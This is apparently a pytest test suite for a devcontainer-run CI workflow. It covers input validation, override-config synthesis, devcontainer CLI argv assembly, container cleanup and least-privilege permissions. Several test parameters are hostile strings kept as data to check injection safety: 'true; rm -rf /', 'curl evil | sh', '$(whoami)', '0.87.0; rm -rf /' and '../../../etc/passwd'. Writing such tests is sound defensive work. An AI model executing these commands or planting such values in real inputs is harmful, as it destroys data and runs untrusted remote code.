"""Unit tests for the devcontainer-run workflow scripts and interface.

Covers dcrun.py (every validation branch, config synthesis, argv assembly,
up-JSON parsing, cleanup command, JSONC parsing), run-devcontainer.py and
cleanup.py (subprocess argv, output emission, exit-code propagation, up-error
handling), validate-inputs.py / check-registry-auth.py, the published-workflow
interface snapshot, injection-safety of the generated run: blocks, the size cap,
and the Renovate @devcontainers/cli pin manager.
"""

from __future__ import annotations

import importlib.util
import json
import re
import subprocess
import sys
from pathlib import Path
from types import ModuleType
from typing import Any

import pytest

from devflows.catalog import load_catalog, load_workflow
from devflows.publish import (
    MAX_GENERATED_WORKFLOW_BYTES,
    build_published_workflow,
    render_published_workflow,
)

REPO = Path(__file__).resolve().parents[1]
SCRIPT_DIR = REPO / "workflows" / "devcontainer-run" / "scripts"

# The workflow scripts import their sibling dcrun module (materialized next to
# them at run time); make it importable here too. The module is named dcrun (not
# the generic "common") so it never collides with another workflow's shared
# module when the whole test suite shares one interpreter.
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))

import dcrun  # type: ignore  # noqa: E402


def _load_script(name: str) -> ModuleType:
    path = SCRIPT_DIR / name
    module_name = "devcontainer_run_" + name.replace("-", "_").removesuffix(".py")
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module


def _base_env(tmp_path: Path, **overrides: str) -> dict[str, str]:
    env = {
        "GITHUB_WORKSPACE": str(tmp_path),
        "DEVCONTAINER_IMAGE": "alpine:3.20",
        "DEVCONTAINER_CONFIG_FILE": "",
        "RUN_COMMAND": "echo hi",
        "RUN_SHELL": "bash",
        "RUN_WORKING_DIRECTORY": "",
        "REMOTE_USER": "",
        "SKIP_POST_CREATE": "false",
        "UPDATE_REMOTE_USER_UID": "on",
        "CONTAINER_ENV": "",
        "DEVCONTAINER_FEATURES": "",
        "DEVCONTAINER_CLI_VERSION": "0.87.0",
    }
    env.update(overrides)
    return env


def _config(**overrides: Any) -> dcrun.Config:
    fields: dict[str, Any] = {
        "image": "alpine:3.20",
        "config_file": "",
        "run_command": "echo hi",
        "run_shell": "bash",
        "run_working_directory": "",
        "remote_user": "",
        "skip_post_create": False,
        "update_remote_user_uid": "on",
        "container_env": (),
        "features": "",
        "cli_version": "0.87.0",
    }
    fields.update(overrides)
    return dcrun.Config(**fields)


# --------------------------------------------------------------------------- #
# run-command / run-shell                                                      #
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("value", ["", "   ", "\n\t"])
def test_empty_run_command_is_rejected(tmp_path, value) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, RUN_COMMAND=value))
    assert "run-command is required" in str(excinfo.value)


@pytest.mark.parametrize("shell", ["bash", "sh"])
def test_valid_run_shell_is_accepted(tmp_path, shell) -> None:
    config = dcrun.parse_and_validate(_base_env(tmp_path, RUN_SHELL=shell))
    assert config.run_shell == shell


@pytest.mark.parametrize("shell", ["zsh", "fish", "python", "BASH"])
def test_invalid_run_shell_is_rejected(tmp_path, shell) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, RUN_SHELL=shell))
    assert "run-shell must be one of" in str(excinfo.value)


def test_run_shell_defaults_to_bash(tmp_path) -> None:
    env = _base_env(tmp_path)
    del env["RUN_SHELL"]
    assert dcrun.parse_and_validate(env).run_shell == "bash"


# --------------------------------------------------------------------------- #
# Image reference + image/config resolution                                   #
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "image",
    [
        "alpine:3.20",
        "debian:bookworm-slim",
        "ghcr.io/owner/project-devcontainer:latest",
        "ghcr.io/owner/img@sha256:" + "a" * 64,
        "myregistry.com:5000/team/img",
    ],
)
def test_valid_image_references_are_accepted(tmp_path, image) -> None:
    config = dcrun.parse_and_validate(_base_env(tmp_path, DEVCONTAINER_IMAGE=image))
    assert config.image == image


@pytest.mark.parametrize("image", ["alpine:bad:ref", "owner//img", "/owner/img", "img:bad tag"])
def test_malformed_image_references_are_rejected(tmp_path, image) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, DEVCONTAINER_IMAGE=image))
    assert "valid image reference" in str(excinfo.value)


def test_neither_image_nor_config_is_rejected(tmp_path) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(
            _base_env(tmp_path, DEVCONTAINER_IMAGE="", DEVCONTAINER_CONFIG_FILE="")
        )
    assert "at least one of devcontainer-image or devcontainer-config-file" in str(excinfo.value)


def test_config_file_alone_satisfies_image_requirement(tmp_path) -> None:
    config = dcrun.parse_and_validate(
        _base_env(
            tmp_path,
            DEVCONTAINER_IMAGE="",
            DEVCONTAINER_CONFIG_FILE=".devcontainer/devcontainer.json",
        )
    )
    assert config.image == ""
    assert config.config_file == ".devcontainer/devcontainer.json"


@pytest.mark.parametrize(
    "path", ["/etc/passwd", "../outside.json", "../../../etc/passwd", "a/../../escape.json"]
)
def test_config_file_escaping_workspace_is_rejected(tmp_path, path) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(
            _base_env(tmp_path, DEVCONTAINER_IMAGE="", DEVCONTAINER_CONFIG_FILE=path)
        )
    assert "must stay inside" in str(excinfo.value)


def test_missing_github_workspace_raises_clear_error(tmp_path) -> None:
    env = _base_env(tmp_path)
    del env["GITHUB_WORKSPACE"]
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(env, require_workspace=True)
    assert "GITHUB_WORKSPACE is not set" in str(excinfo.value)


# --------------------------------------------------------------------------- #
# working-directory / remote-user / uid mode                                  #
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("path", ["/abs/dir", "../up", "sub/../../escape"])
def test_working_directory_escaping_workspace_is_rejected(tmp_path, path) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, RUN_WORKING_DIRECTORY=path))
    assert "must stay inside" in str(excinfo.value)


def test_working_directory_is_normalized(tmp_path) -> None:
    config = dcrun.parse_and_validate(_base_env(tmp_path, RUN_WORKING_DIRECTORY="./pkg/sub"))
    assert config.run_working_directory == "pkg/sub"


@pytest.mark.parametrize("user", ["root", "vscode", "1000", "dev-user_1"])
def test_valid_remote_user_is_accepted(tmp_path, user) -> None:
    assert dcrun.parse_and_validate(_base_env(tmp_path, REMOTE_USER=user)).remote_user == user


@pytest.mark.parametrize("user", ["a b", "root;id", "$(whoami)", "root\ninjected"])
def test_invalid_remote_user_is_rejected(tmp_path, user) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, REMOTE_USER=user))
    assert "remote-user must be" in str(excinfo.value)


@pytest.mark.parametrize("mode", ["never", "on", "off"])
def test_valid_uid_mode_is_accepted(tmp_path, mode) -> None:
    config = dcrun.parse_and_validate(_base_env(tmp_path, UPDATE_REMOTE_USER_UID=mode))
    assert config.update_remote_user_uid == mode


@pytest.mark.parametrize("mode", ["always", "yes", "On"])
def test_invalid_uid_mode_is_rejected(tmp_path, mode) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, UPDATE_REMOTE_USER_UID=mode))
    assert "update-remote-user-uid must be one of" in str(excinfo.value)


# --------------------------------------------------------------------------- #
# container-env / features / cli-version                                      #
# --------------------------------------------------------------------------- #
def test_container_env_parses_key_value_lines(tmp_path) -> None:
    config = dcrun.parse_and_validate(
        _base_env(tmp_path, CONTAINER_ENV="CI=true\n\nTOKEN=a=b=c\n  ")
    )
    assert config.container_env == ("CI=true", "TOKEN=a=b=c")


@pytest.mark.parametrize("value", ["NOEQUALS", "1BAD=x", "has space=x"])
def test_invalid_container_env_is_rejected(tmp_path, value) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, CONTAINER_ENV=value))
    assert "container-env" in str(excinfo.value)


def test_features_json_object_is_accepted(tmp_path) -> None:
    raw = '{"ghcr.io/devcontainers/features/node:1": {}}'
    assert dcrun.parse_and_validate(_base_env(tmp_path, DEVCONTAINER_FEATURES=raw)).features == raw


@pytest.mark.parametrize("value", ["{not json", "[1, 2]", '"a string"', "42"])
def test_invalid_features_json_is_rejected(tmp_path, value) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, DEVCONTAINER_FEATURES=value))
    assert "devcontainer-features must be" in str(excinfo.value)


@pytest.mark.parametrize("version", ["0.87.0", "1.0.0", "0.87.0-beta.1"])
def test_valid_cli_version_is_accepted(tmp_path, version) -> None:
    assert (
        dcrun.parse_and_validate(_base_env(tmp_path, DEVCONTAINER_CLI_VERSION=version)).cli_version
        == version
    )


@pytest.mark.parametrize("version", ["", "latest", "0.87", "0.87.0; rm -rf /", "$(echo 1)"])
def test_invalid_cli_version_is_rejected(tmp_path, version) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_and_validate(_base_env(tmp_path, DEVCONTAINER_CLI_VERSION=version))
    assert "devcontainer-cli-version" in str(excinfo.value)


# --------------------------------------------------------------------------- #
# Registry auth preflight                                                     #
# --------------------------------------------------------------------------- #
def test_registry_auth_ok_when_login_disabled() -> None:
    dcrun.validate_registry_auth({"DOCKER_LOGIN_ENABLED": "false", "DOCKER_REGISTRY": "docker.io"})


def test_registry_auth_ok_for_ghcr_without_password() -> None:
    dcrun.validate_registry_auth(
        {
            "DOCKER_LOGIN_ENABLED": "true",
            "DOCKER_REGISTRY": "ghcr.io",
            "DOCKER_PASSWORD_SET": "false",
        }
    )


def test_registry_auth_ok_with_password_anywhere() -> None:
    dcrun.validate_registry_auth(
        {
            "DOCKER_LOGIN_ENABLED": "true",
            "DOCKER_REGISTRY": "docker.io",
            "DOCKER_PASSWORD_SET": "true",
        }
    )


def test_registry_auth_rejects_non_ghcr_without_password() -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.validate_registry_auth(
            {
                "DOCKER_LOGIN_ENABLED": "true",
                "DOCKER_REGISTRY": "docker.io",
                "DOCKER_PASSWORD_SET": "false",
            }
        )
    assert "restricted to ghcr.io" in str(excinfo.value)


# --------------------------------------------------------------------------- #
# JSONC parsing                                                               #
# --------------------------------------------------------------------------- #
def test_parse_jsonc_plain_json() -> None:
    assert dcrun.parse_jsonc('{"image": "alpine:3.20"}') == {"image": "alpine:3.20"}


def test_parse_jsonc_with_comments_and_trailing_commas() -> None:
    text = """
    {
        // line comment
        "image": "alpine:3.20", /* block */
        "remoteUser": "root",
    }
    """
    assert dcrun.parse_jsonc(text) == {"image": "alpine:3.20", "remoteUser": "root"}


def test_parse_jsonc_keeps_url_slashes_in_strings() -> None:
    # A // inside a string value must not be treated as a comment.
    assert dcrun.parse_jsonc('{"image": "ghcr.io/o/i:1"}') == {"image": "ghcr.io/o/i:1"}


# --------------------------------------------------------------------------- #
# Config synthesis                                                            #
# --------------------------------------------------------------------------- #
def test_synthesize_minimal_config_from_image() -> None:
    assert dcrun.synthesize_override_config(_config(image="alpine:3.20"), None) == {
        "image": "alpine:3.20"
    }


def test_synthesize_preserves_caller_config_and_overrides_image() -> None:
    caller = {"image": "old:1", "features": {"x": {}}, "postCreateCommand": "make"}
    result = dcrun.synthesize_override_config(_config(image="new:2"), caller)
    assert result == {"image": "new:2", "features": {"x": {}}, "postCreateCommand": "make"}


def test_synthesize_uses_caller_image_when_input_empty() -> None:
    caller = {"image": "from-config:1", "postStartCommand": "start"}
    result = dcrun.synthesize_override_config(_config(image=""), caller)
    assert result["image"] == "from-config:1"
    assert result["postStartCommand"] == "start"


def test_synthesize_injects_remote_user() -> None:
    result = dcrun.synthesize_override_config(
        _config(image="alpine:3.20", remote_user="root"), None
    )
    assert result["remoteUser"] == "root"


def test_synthesize_rejects_config_without_image() -> None:
    caller = {"build": {"dockerfile": "Dockerfile"}}
    with pytest.raises(SystemExit) as excinfo:
        dcrun.synthesize_override_config(_config(image=""), caller)
    assert "no image could be resolved" in str(excinfo.value)


def test_load_caller_config_reads_workspace_file(tmp_path) -> None:
    (tmp_path / ".devcontainer").mkdir()
    (tmp_path / ".devcontainer" / "devcontainer.json").write_text(
        '{"image": "alpine:3.20"}', encoding="utf-8"
    )
    result = dcrun.load_caller_config(tmp_path, ".devcontainer/devcontainer.json")
    assert result == {"image": "alpine:3.20"}


def test_load_caller_config_missing_file_errors(tmp_path) -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.load_caller_config(tmp_path, "missing/devcontainer.json")
    assert "does not exist" in str(excinfo.value)


def test_load_caller_config_none_when_unset(tmp_path) -> None:
    assert dcrun.load_caller_config(tmp_path, "") is None


# --------------------------------------------------------------------------- #
# up / exec argv assembly                                                     #
# --------------------------------------------------------------------------- #
_WS = Path("/ws")
_CFG = Path("/tmp/devflows/devcontainer.json")
_LABEL = "devflows.run=42-1"


def test_cli_invocation_uses_pinned_npx() -> None:
    # The pinned CLI runs ephemerally via npx (the npm peer of uvx), never a
    # global npm install, so no ad-hoc package-install step reaches the workflow.
    assert dcrun.cli_invocation(_config(cli_version="0.87.0")) == [
        "npx",
        "--yes",
        "@devcontainers/cli@0.87.0",
    ]


def test_build_up_argv_core_flags() -> None:
    argv = dcrun.build_up_argv(_config(), _WS, _CFG, _LABEL)
    assert argv[:3] == ["npx", "--yes", "@devcontainers/cli@0.87.0"]
    assert argv[3] == "up"
    assert argv[argv.index("--workspace-folder") + 1] == "/ws"
    assert argv[argv.index("--override-config") + 1] == str(_CFG)
    assert argv[argv.index("--id-label") + 1] == _LABEL
    assert argv[argv.index("--log-format") + 1] == "json"
    assert argv[argv.index("--update-remote-user-uid-default") + 1] == "on"
    assert "--remove-existing-container" in argv
    # Off by default.
    assert "--skip-post-create" not in argv
    assert "--additional-features" not in argv
    assert "--remote-env" not in argv


def test_build_up_argv_optional_flags() -> None:
    features = '{"ghcr.io/f/node:1": {}}'
    config = _config(
        skip_post_create=True,
        features=features,
        container_env=("CI=true", "TOKEN=x"),
        update_remote_user_uid="never",
    )
    argv = dcrun.build_up_argv(config, _WS, _CFG, _LABEL)
    assert "--skip-post-create" in argv
    assert argv[argv.index("--additional-features") + 1] == features
    assert argv[argv.index("--update-remote-user-uid-default") + 1] == "never"
    remote_envs = [argv[i + 1] for i, tok in enumerate(argv) if tok == "--remote-env"]
    assert remote_envs == ["CI=true", "TOKEN=x"]


def test_build_exec_argv_correlates_to_up_container() -> None:
    argv = dcrun.build_exec_argv(_config(run_command="pytest -q"), _WS, _CFG, _LABEL)
    assert argv[:3] == ["npx", "--yes", "@devcontainers/cli@0.87.0"]
    assert argv[3] == "exec"
    # Same override-config and id-label as `up` so exec hits the one container.
    assert argv[argv.index("--override-config") + 1] == str(_CFG)
    assert argv[argv.index("--id-label") + 1] == _LABEL
    separator = argv.index("--")
    assert argv[separator + 1 :] == ["bash", "-c", "pytest -q"]


def test_build_exec_argv_passes_remote_env() -> None:
    argv = dcrun.build_exec_argv(_config(container_env=("CI=true",)), _WS, _CFG, _LABEL)
    assert argv[argv.index("--remote-env") + 1] == "CI=true"


def test_build_exec_command_prepends_working_directory() -> None:
    payload = dcrun.build_exec_command(
        _config(run_command="pytest", run_working_directory="pkg/sub")
    )
    assert payload == "cd pkg/sub && pytest"


def test_build_exec_command_quotes_working_directory_with_spaces() -> None:
    payload = dcrun.build_exec_command(_config(run_command="ls", run_working_directory="a dir"))
    assert payload == "cd 'a dir' && ls"


# --------------------------------------------------------------------------- #
# Injection safety                                                            #
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize(
    "command",
    [
        "echo $(whoami)",
        "true; rm -rf /",
        "printf 'a b c'",
        "echo `id` && curl evil | sh",
        'echo "spaces and ; and $(x)"',
    ],
)
def test_run_command_stays_a_single_argv_token(command) -> None:
    argv = dcrun.build_exec_argv(_config(run_command=command), _WS, _CFG, _LABEL)
    # The command is delivered verbatim as the single -c payload; the shell in the
    # container interprets it, but the workflow never splits or re-expands it.
    assert argv[-3:] == [_config().run_shell, "-c", command]
    assert argv.count(command) == 1


# --------------------------------------------------------------------------- #
# up-JSON parsing                                                             #
# --------------------------------------------------------------------------- #
def test_parse_up_result_success() -> None:
    stdout = (
        '{"log": "starting"}\n'
        '{"outcome":"success","containerId":"abc123","remoteUser":"root",'
        '"remoteWorkspaceFolder":"/workspaces/x"}\n'
    )
    result = dcrun.parse_up_result(stdout)
    assert result["outcome"] == "success"
    assert result["containerId"] == "abc123"
    assert result["remoteUser"] == "root"


def test_parse_up_result_error() -> None:
    stdout = '{"outcome":"error","message":"Command failed","containerId":"deadbeef"}\n'
    result = dcrun.parse_up_result(stdout)
    assert result["outcome"] == "error"
    assert result["message"] == "Command failed"


def test_parse_up_result_takes_last_outcome_object() -> None:
    stdout = '{"outcome":"error"}\n{"outcome":"success","containerId":"z"}\n'
    assert dcrun.parse_up_result(stdout)["outcome"] == "success"


def test_parse_up_result_without_result_raises() -> None:
    with pytest.raises(SystemExit) as excinfo:
        dcrun.parse_up_result('{"log":"only logs"}\nplain text\n')
    assert "did not emit a JSON result" in str(excinfo.value)


def test_build_cleanup_ids_command() -> None:
    assert dcrun.build_cleanup_ids_command("devflows.run=42-1") == [
        "docker",
        "ps",
        "-aq",
        "--filter",
        "label=devflows.run=42-1",
    ]


# --------------------------------------------------------------------------- #
# run-devcontainer.py                                                         #
# --------------------------------------------------------------------------- #
def _verb(argv: list[str]) -> str | None:
    """The high-level verb of a recorded subprocess call.

    'pull' for `docker pull`, else the devcontainer subcommand ('up'/'exec')
    that follows the `npx --yes @devcontainers/cli@<v>` prefix.
    """
    if argv[:2] == ["docker", "pull"]:
        return "pull"
    if argv[:1] == ["npx"]:
        return argv[3]
    return None


class _FakeDocker:
    """A subprocess.run stand-in dispatching on the argv verb."""

    def __init__(self, *, up_stdout: str, exec_rc: int = 0, pull_rc: int = 0) -> None:
        self.up_stdout = up_stdout
        self.exec_rc = exec_rc
        self.pull_rc = pull_rc
        self.calls: list[list[str]] = []

    def __call__(self, argv, **kwargs):  # noqa: ANN001
        self.calls.append(list(argv))
        verb = _verb(argv)
        if verb == "pull":
            return subprocess.CompletedProcess(argv, self.pull_rc)
        if verb == "up":
            return subprocess.CompletedProcess(argv, 0, stdout=self.up_stdout)
        if verb == "exec":
            return subprocess.CompletedProcess(argv, self.exec_rc)
        raise AssertionError(f"unexpected argv {argv!r}")


def _run_env(tmp_path: Path, **overrides: str) -> dict[str, str]:
    env = _base_env(tmp_path, **overrides)
    env["RUNNER_TEMP"] = str(tmp_path / "runner-temp")
    env["ID_LABEL"] = _LABEL
    env["GITHUB_OUTPUT"] = str(tmp_path / "out.txt")
    return env


def test_run_devcontainer_pulls_up_execs_and_emits_outputs(tmp_path, monkeypatch) -> None:
    module = _load_script("run-devcontainer.py")
    fake = _FakeDocker(
        up_stdout='{"outcome":"success","containerId":"c0ffee","remoteUser":"root"}\n',
        exec_rc=0,
    )
    monkeypatch.setattr(module.subprocess, "run", fake)
    for key, value in _run_env(tmp_path).items():
        monkeypatch.setenv(key, value)

    assert module.main() == 0
    verbs = [_verb(c) for c in fake.calls]
    assert "pull" in verbs
    assert "up" in verbs
    assert "exec" in verbs
    # The pull targets the resolved image.
    pull = next(c for c in fake.calls if c[:2] == ["docker", "pull"])
    assert pull[2] == "alpine:3.20"
    # Outputs are emitted from the up JSON.
    out = (tmp_path / "out.txt").read_text(encoding="utf-8")
    assert "container-id=c0ffee\n" in out
    assert "remote-user=root\n" in out
    # The override config was written to RUNNER_TEMP (not the checkout).
    cfg = tmp_path / "runner-temp" / "devflows-devcontainer-run" / "devcontainer.json"
    assert json.loads(cfg.read_text(encoding="utf-8")) == {"image": "alpine:3.20"}


def test_run_devcontainer_propagates_exec_exit_code(tmp_path, monkeypatch) -> None:
    module = _load_script("run-devcontainer.py")
    fake = _FakeDocker(
        up_stdout='{"outcome":"success","containerId":"x","remoteUser":"root"}\n', exec_rc=42
    )
    monkeypatch.setattr(module.subprocess, "run", fake)
    for key, value in _run_env(tmp_path).items():
        monkeypatch.setenv(key, value)
    assert module.main() == 42


def test_run_devcontainer_fails_on_up_error(tmp_path, monkeypatch) -> None:
    module = _load_script("run-devcontainer.py")
    fake = _FakeDocker(
        up_stdout='{"outcome":"error","message":"postCreateCommand failed","containerId":"x"}\n'
    )
    monkeypatch.setattr(module.subprocess, "run", fake)
    for key, value in _run_env(tmp_path).items():
        monkeypatch.setenv(key, value)
    with pytest.raises(SystemExit) as excinfo:
        module.main()
    assert "devcontainer up failed" in str(excinfo.value)
    # exec is never attempted after an up error.
    assert "exec" not in [_verb(c) for c in fake.calls]


def test_run_devcontainer_fails_fast_on_pull_error(tmp_path, monkeypatch) -> None:
    module = _load_script("run-devcontainer.py")
    fake = _FakeDocker(up_stdout="", pull_rc=1)
    monkeypatch.setattr(module.subprocess, "run", fake)
    for key, value in _run_env(tmp_path).items():
        monkeypatch.setenv(key, value)
    with pytest.raises(SystemExit) as excinfo:
        module.main()
    assert "Failed to pull image" in str(excinfo.value)
    assert "up" not in [_verb(c) for c in fake.calls]


def test_run_devcontainer_merges_config_file(tmp_path, monkeypatch) -> None:
    (tmp_path / ".devcontainer").mkdir()
    (tmp_path / ".devcontainer" / "devcontainer.json").write_text(
        '{"image": "debian:bookworm-slim", "postCreateCommand": "make setup"}', encoding="utf-8"
    )
    module = _load_script("run-devcontainer.py")
    fake = _FakeDocker(up_stdout='{"outcome":"success","containerId":"x","remoteUser":"root"}\n')
    monkeypatch.setattr(module.subprocess, "run", fake)
    env = _run_env(
        tmp_path,
        DEVCONTAINER_IMAGE="",
        DEVCONTAINER_CONFIG_FILE=".devcontainer/devcontainer.json",
        REMOTE_USER="root",
    )
    for key, value in env.items():
        monkeypatch.setenv(key, value)

    assert module.main() == 0
    cfg = tmp_path / "runner-temp" / "devflows-devcontainer-run" / "devcontainer.json"
    written = json.loads(cfg.read_text(encoding="utf-8"))
    assert written == {
        "image": "debian:bookworm-slim",
        "postCreateCommand": "make setup",
        "remoteUser": "root",
    }


# --------------------------------------------------------------------------- #
# cleanup.py                                                                  #
# --------------------------------------------------------------------------- #
def test_cleanup_removes_labelled_containers(tmp_path, monkeypatch) -> None:
    module = _load_script("cleanup.py")
    calls: list[list[str]] = []

    def _run(argv, **kwargs):  # noqa: ANN001
        calls.append(list(argv))
        if argv[:2] == ["docker", "ps"]:
            return subprocess.CompletedProcess(argv, 0, stdout="c1\nc2\n")
        return subprocess.CompletedProcess(argv, 0)

    monkeypatch.setattr(module.subprocess, "run", _run)
    monkeypatch.setenv("REMOVE_CONTAINER", "true")
    monkeypatch.setenv("ID_LABEL", _LABEL)
    assert module.main() == 0
    assert ["docker", "rm", "-f", "c1"] in calls
    assert ["docker", "rm", "-f", "c2"] in calls


def test_cleanup_skips_when_remove_disabled(tmp_path, monkeypatch) -> None:
    module = _load_script("cleanup.py")
    monkeypatch.setattr(
        module.subprocess, "run", lambda *a, **k: pytest.fail("must not call docker")
    )
    monkeypatch.setenv("REMOVE_CONTAINER", "false")
    monkeypatch.setenv("ID_LABEL", _LABEL)
    assert module.main() == 0


def test_cleanup_tolerates_no_matches(tmp_path, monkeypatch) -> None:
    module = _load_script("cleanup.py")

    def _run(argv, **kwargs):  # noqa: ANN001
        if argv[:2] == ["docker", "ps"]:
            return subprocess.CompletedProcess(argv, 0, stdout="\n")
        pytest.fail("docker rm must not run when nothing matched")

    monkeypatch.setattr(module.subprocess, "run", _run)
    monkeypatch.setenv("REMOVE_CONTAINER", "true")
    monkeypatch.setenv("ID_LABEL", _LABEL)
    assert module.main() == 0


# --------------------------------------------------------------------------- #
# validate-inputs.py / check-registry-auth.py                                 #
# --------------------------------------------------------------------------- #
def test_validate_inputs_main_accepts(tmp_path, monkeypatch, capsys) -> None:
    module = _load_script("validate-inputs.py")
    for key, value in _base_env(tmp_path).items():
        monkeypatch.setenv(key, value)
    assert module.main() == 0
    assert "inputs are valid" in capsys.readouterr().out


def test_validate_inputs_main_rejects(tmp_path, monkeypatch) -> None:
    module = _load_script("validate-inputs.py")
    for key, value in _base_env(tmp_path, RUN_SHELL="zsh").items():
        monkeypatch.setenv(key, value)
    with pytest.raises(SystemExit):
        module.main()


def test_check_registry_auth_main_accepts(monkeypatch, capsys) -> None:
    module = _load_script("check-registry-auth.py")
    monkeypatch.setenv("DOCKER_LOGIN_ENABLED", "false")
    assert module.main() == 0
    assert "registry auth is consistent" in capsys.readouterr().out


def test_check_registry_auth_main_rejects(monkeypatch) -> None:
    module = _load_script("check-registry-auth.py")
    monkeypatch.setenv("DOCKER_LOGIN_ENABLED", "true")
    monkeypatch.setenv("DOCKER_REGISTRY", "docker.io")
    monkeypatch.setenv("DOCKER_PASSWORD_SET", "false")
    with pytest.raises(SystemExit):
        module.main()


# --------------------------------------------------------------------------- #
# Published interface snapshot                                                #
# --------------------------------------------------------------------------- #
def _published() -> dict[str, Any]:
    for item in load_catalog():
        if item.id == "devcontainer-run":
            return build_published_workflow(item)
    raise AssertionError("devcontainer-run workflow not found in catalog")


def _workflow_call(published: dict[str, Any]) -> dict[str, Any]:
    return published["on"]["workflow_call"]


def test_domain_inputs_match_the_design() -> None:
    inputs = _workflow_call(_published())["inputs"]
    domain = {
        "devcontainer-image",
        "devcontainer-config-file",
        "run-command",
        "run-shell",
        "run-working-directory",
        "remote-user",
        "skip-post-create",
        "update-remote-user-uid",
        "container-env",
        "devcontainer-features",
        "remove-container",
        "devcontainer-cli-version",
        "run-timeout-minutes",
        "docker-login-enabled",
        "docker-registry",
        "docker-username",
    }
    assert domain <= set(inputs)
    assert inputs["run-command"]["required"] is True
    assert inputs["devcontainer-image"]["required"] is False
    assert inputs["run-shell"]["default"] == "bash"
    assert inputs["update-remote-user-uid"]["default"] == "on"
    assert inputs["remove-container"]["default"] is True
    assert inputs["docker-login-enabled"]["default"] is False
    assert inputs["devcontainer-cli-version"]["default"] == "0.87.0"
    assert inputs["run-timeout-minutes"]["default"] == 30
    # Channel inputs are generator-injected (checkout + both artifact channels);
    # writeback is NOT (io.writeback is false).
    channels = {"checkout-enabled", "artifact-download-enabled", "artifact-upload-enabled"}
    assert channels <= set(inputs)
    assert "commit-enabled" not in inputs


def test_outputs_echo_the_run_job() -> None:
    outputs = _workflow_call(_published())["outputs"]
    assert set(outputs) == {"container-id", "remote-user"}
    assert outputs["container-id"]["value"] == "${{ jobs.run.outputs.container-id }}"
    assert outputs["remote-user"]["value"] == "${{ jobs.run.outputs.remote-user }}"


def test_permissions_are_least_privilege() -> None:
    published = _published()
    assert published["permissions"] == {}
    assert published["jobs"]["validate"]["permissions"] == {}
    # Run needs contents: read (checkout), packages: read (private ghcr pull),
    # and actions: read (artifact channels, generator-injected).
    assert published["jobs"]["run"]["permissions"] == {
        "contents": "read",
        "packages": "read",
        "actions": "read",
    }
    for job in published["jobs"].values():
        perms = job.get("permissions", {})
        assert "write" not in " ".join(f"{k}:{v}" for k, v in perms.items())
        assert "id-token" not in perms


def test_run_needs_validate_and_only_docker_secret() -> None:
    published = _published()
    assert published["jobs"]["run"]["needs"] == "validate"
    secrets = _workflow_call(published).get("secrets", {})
    assert "docker-password" in secrets
    assert set(secrets) <= {
        "docker-password",
        "checkout-token",
        "checkout-ssh-key",
        "artifact-download-token",
    }


def test_no_input_is_interpolated_into_a_run_block() -> None:
    for job in _published()["jobs"].values():
        for step in job.get("steps", []):
            run = step.get("run")
            if isinstance(run, str):
                assert "${{ inputs." not in run
                assert "${{ matrix." not in run


def test_validate_step_env_maps_only_inputs() -> None:
    # Required so the validation-failure scenario harness can reconstruct the env.
    # Only the discovered validate step (running validate-inputs.py) is checked;
    # the separate registry-auth step legitimately reads a secret expression.
    validate = _published()["jobs"]["validate"]
    step = next(s for s in validate["steps"] if s.get("name") == "Validate inputs")
    for key, value in step["env"].items():
        if key == "DEVFLOWS_SCRIPT_ROOT":
            continue
        assert re.fullmatch(r"\$\{\{ inputs\.[a-z0-9-]+ \}\}", value), (key, value)


def test_generated_workflow_is_under_the_size_cap() -> None:
    rendered = render_published_workflow(
        next(item for item in load_catalog() if item.id == "devcontainer-run")
    )
    assert len(rendered.encode("utf-8")) < MAX_GENERATED_WORKFLOW_BYTES


# --------------------------------------------------------------------------- #
# Renovate @devcontainers/cli pin                                             #
# --------------------------------------------------------------------------- #
def test_cli_version_pin_matches_renovate_manager() -> None:
    workflow = load_workflow(REPO / "workflows" / "devcontainer-run")
    default = workflow.workflow_call["inputs"]["devcontainer-cli-version"]["default"]
    assert default == "0.87.0"

    renovate = (REPO / "renovate.json5").read_text(encoding="utf-8")
    assert "workflows/devcontainer-run/workflow" in renovate
    # Pull the devcontainer-run manager's ACTUAL configured matchString out of
    # renovate.json5 (the first `# renovate:` matchString after this manager's
    # file pattern) and apply it to the source workflow.yaml, proving the manager
    # still matches the pinned default so the version keeps auto-updating. The
    # matchString is single-quoted in JSON5 and has no single quote inside, so it
    # extracts cleanly up to the closing quote.
    tail = renovate[renovate.index("workflows/devcontainer-run/workflow") :]
    match_strings = re.findall(r"'(# renovate:[^']*)'", tail)
    assert match_strings, "no matchString found for the devcontainer-run manager"
    configured = match_strings[0].replace("\\\\", "\\")  # JSON5 unescape
    python_pattern = re.sub(r"\(\?<([A-Za-z_]\w*)>", r"(?P<\1>", configured)
    source = (SCRIPT_DIR.parent / "workflow.yaml").read_text(encoding="utf-8")
    match = re.search(python_pattern, source)
    assert match is not None, python_pattern
    assert match.group("datasource") == "npm"
    assert match.group("depName") == "@devcontainers/cli"
    assert match.group("currentValue") == "0.87.0"
